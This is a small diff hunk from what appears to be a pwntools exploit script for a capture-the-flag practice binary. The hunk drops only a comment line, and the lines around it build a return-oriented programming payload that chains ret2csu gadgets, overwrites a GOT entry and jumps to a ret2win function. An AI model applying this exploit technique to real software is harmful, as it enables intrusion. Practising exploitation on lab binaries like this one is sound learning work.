@@ -14,7 +14,7 @@ add=0x00000000004005e8 							#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [
 gdb.attach(r, """break *0x000000000040069a""")
 poprdi=0x00000000004006a3 						#pop rdi ; ret
 payload="a"*40
-#write
+
 payload+=p64(0x000000000040069a)+p64(pwnme_addrspret_offset)+p64(pwnme_got+0x3d)+p64(0)*4+p64(add)
 payload+=ret2csu(0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d,pwnme_got)
 payload+=p64(poprdi)+p64(0xdeadbeefdeadbeef)+p64(ret2win)
